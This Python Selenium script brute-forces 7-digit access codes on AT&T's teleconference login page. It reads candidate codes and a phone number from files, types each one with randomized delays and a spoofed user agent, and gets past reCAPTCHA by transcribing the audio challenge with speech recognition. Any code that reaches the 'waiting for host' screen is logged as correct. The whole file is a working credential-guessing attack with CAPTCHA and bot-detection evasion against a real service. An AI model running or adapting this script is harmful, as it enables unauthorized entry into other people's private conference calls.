import selenium 
from selenium import webdriver

from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.support.ui import Select
#from selenium.webdriver.firefox.service import Service
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
from webdriver_manager.firefox import GeckoDriverManager
import platform
import time
import random
import json
from twocaptcha import solve_captcha
from connectionStatus import is_connected
from tqdm import tqdm
from audioCaptcha import speech_rec



service = Service(executable_path = 'chromedriver.exe')






options = webdriver.ChromeOptions()


options.add_argument("--disable-notifications")
options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36")
#to disable the extensions
options.add_argument("--disable-extensions")


#binary = FirefoxBinary("C:\\Users\\Admin\\Desktop\\Tor Browser\\Browser\\firefox.exe")


def main(code7 , number , driver):
    

    target_site = "https://teleconference.uc.att.com/ecm/"
    
    
    driver.get(target_site)
    print('The program has been stopped for 5 straight minute bruv')
    time.sleep(300)
    
    phone_number_input = WebDriverWait(driver , 10).until(EC.presence_of_element_located((By.XPATH , "//input[@id='bp']")))
    print('Page Load Succeeded')
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    actions = ActionChains(driver).send_keys(Keys.END).perform()
   
    print('Putting  the phone number')

    phone_number_input.click()
    ActionChains(driver).key_down(Keys.CONTROL).send_keys('A').key_up(Keys.CONTROL).perform()
    for num in number[1:]:
        phone_number_input.send_keys(num)
        time.sleep(random.uniform(0 , 0.3))
    print('Phone number DONE')


    id_input = driver.find_element(By.XPATH , "//input[@id='mac']")
    id_input.click()
    print('Putting the CODE')
    print(f'The Code Being used is {code7.strip()[:-1]} -------- {len(code7digits)} remaining to test')
    ActionChains(driver).key_down(Keys.CONTROL).send_keys('A').key_up(Keys.CONTROL).perform()
    for code in code7.strip()[:-1]:
        id_input.send_keys(code)
        time.sleep(random.uniform(0.1 , 0.3))
    time.sleep(random.uniform(0.3 , 1.2))
    print('CODE DONE Bruv')


    print('TIme to put the name bro')
    name_input = driver.find_element(By.XPATH , "//input[@id='userName']")
    name_input.click()
    name = 'roger'
    ActionChains(driver).key_down(Keys.CONTROL).send_keys('A').key_up(Keys.CONTROL).perform()
    for i in name:
        name_input.send_keys(i)
        time.sleep(random.uniform(0.1 , 0.4))
    print('Name DONE Bruv')
    #time.sleep(120) --------------------------------------------------------------------------------------------------------------------
    print('scraping the source (SRC) attribute from the recaptcha frame')

    try:
        driver.switch_to.frame(driver.find_element(By.XPATH , "//iframe[@title='reCAPTCHA']"))
        #iframe_src = iframe.get_attribute('src')
        #google_captcha_response_input = driver.find_element(By.ID, 'g-recaptcha-response')
        try:
            captcha = WebDriverWait(driver , 5).until(EC.presence_of_element_located((By.XPATH , "//span[@id='recaptcha-anchor']")))
            time.sleep(0.2)

        except:
            captcha = WebDriverWait(driver , 5).until(EC.presence_of_all_elements_located((By.XPATH , "//div[@id='rc-anchor-container']")))
            time.sleep(0.2)
        captcha.click()
        driver.switch_to.default_content()
        time.sleep(2)
        driver.switch_to.frame(driver.find_element(By.XPATH , "//iframe[@title = 'recaptcha challenge expires in two minutes']"))

        try:
            print('Trying to click on the audio captcha button')
            audio_button = driver.find_element(By.XPATH , "//button[@id='recaptcha-audio-button']")
            audio_button.click()
            print('Clicking on audio captcha was a success')
            try:
                try_later = WebDriverWait(driver , 5).until(EC.presence_of_all_elements_located((By.XPATH , "//div[@class='rc-doscaptcha-header-text' and text() = 'Try again later']")))
                print('The Captcha showed to try later bro')
            except:
                print('Neither the code clicked on the audio button nor the captcha showed up bro')
                pass
        except:
            try:
                try_later = driver.find_element(By.XPATH , "//div[@class='rc-doscaptcha-header-text' and text() = 'Try again later']")
                print('The Captcha showed to try later bro')
                return 'again'
            except:
                print('Neither the code clicked on the audio button nor the captcha showed up bro')
                return 'again'
    except:
        print('There was an error in the captcha section bro')
        return 'again'
    
    audio_src = WebDriverWait(driver , 10).until(EC.presence_of_element_located((By.XPATH , "//audio[@id='audio-source']")))
    the_audio_src = audio_src.get_attribute('src')
    
    print(f'The link to the audio is {the_audio_src} -------------------------------------- +++++ ')
    audio_to_text = speech_rec(the_audio_src )

    audio_captcha_input = driver.find_element(By.XPATH , "//input[@id='audio-response']")
    for i in audio_to_text:
        audio_captcha_input.send_keys(i)
        time.sleep(random.uniform(0.2 , 0.6))
    print('Clicking On the Verify button')
    verify_button = driver.find_element(By.XPATH , "//button[@id='recaptcha-verify-button' and text()='Verify']")
    verify_button.click()
    driver.switch_to.default_content()


    time.sleep(1.2)
    print('Time to click on the CONTINUE BUTTON BRO +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++')
    continue_button = driver.find_element(By.XPATH , "//button[@class='button button--appearance-square button--theme-dark button--role-none button--full-width button--enabled ' and text() = 'Continue']")
    continue_button.click()


    time.sleep(1)
        
    #correct id
    try:
        waiting_for_the_host = WebDriverWait(driver , 10).until(EC.presence_of_element_located((By.XPATH , "//div[@class='status__message']//p[text() = 'Waiting for host to join']")))
        print('A correct code is found')
        
        time.sleep(2)
        
        with open('rightcode.txt' , 'a' , encoding = 'utf-8') as file:
            file.write(code7)
        print(f'{code7} turned out to be a correct and it has been saved in a separate file bro')
        driver.refresh()
        return 'notagain'
        
        
        
    except NoSuchElementException:
        print('NO SUCH ELEMENT EXCEPTION OCCURED ---- !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        time.sleep(1)
        driver.execute_script("window.scrollTo(0, 900);")
        return 'again'
    
    except TimeoutException:
        time.sleep(1)
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        print('A TIMEOUT EXCEPTION OCCURED')    
        return 'again'
    except:
        try:
            driver.find_element(By.XPATH , "//div[@class='form__general-error-msg' and text()='Login failed. One or more of the credentials you entered is invalid.']")
            
            
            driver.refresh()
            return 'notagain'
           
        except:
            print('This Aint no Login Failed Error Bruh Its something else : ->')
        
       

if __name__ == '__main__':
    driver = webdriver.Chrome( options=options)
    #loading 7 digit codes and store in a list
    with open("doc/7digitcodes.txt", 'r') as file:
        code7digits = file.readlines()
    print(f'7digitcodes.txt has been opened with {len(code7digits)} codes')
    print(code7digits)
    #getting the phone number from the text file
    with open('doc/phonenumber.txt','r') as file:
        number = file.read().strip()
    
    code_pointer = 0
    for code in code7digits:
        res = main(code , number  , driver )
        while res == 'again':
            driver.refresh()
            res = main(code , number , driver )

            if res == 'not again':
                break
        
        code_pointer +=1

        #managing the removal of used codes
        with open('doc/7digitcodes.txt' , 'w' , encoding = 'utf-8') as file:
            file.writelines(code7digits[code_pointer:])
        print(f'{len(code7digits)} CODES REMAINIG FOR TEST BRO')
